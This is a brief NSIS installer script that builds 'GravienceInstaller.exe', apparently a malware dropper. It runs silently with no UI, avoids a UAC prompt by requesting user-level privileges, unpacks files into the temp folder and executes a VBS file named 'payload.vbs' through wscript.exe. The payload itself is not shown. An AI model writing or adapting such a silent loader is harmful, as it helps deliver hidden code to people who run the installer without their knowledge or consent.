OutFile "GravienceInstaller.exe"   ; Output EXE file name
InstallDir "$TEMP\Grave"           ; Install directory for unpacked files

RequestExecutionLevel user         ; Request user-level privileges (no UAC prompt)

Section                           ; Start of the main installation section
  SetSilent silent                ; Set silent mode (no UI)
  SetOutPath "$TEMP\Gravience"    ; Set the destination folder for unpacked files

  ; Locate and copy everything from the "Gravience" folder
  File /r "Gravience\*.*"         ; Include all files from the "Gravience" folder

  ; Execute the VBS file after extraction
  ExecWait '"wscript.exe" "$TEMP\Gravience\payload.vbs"'

SectionEnd                        ; End of section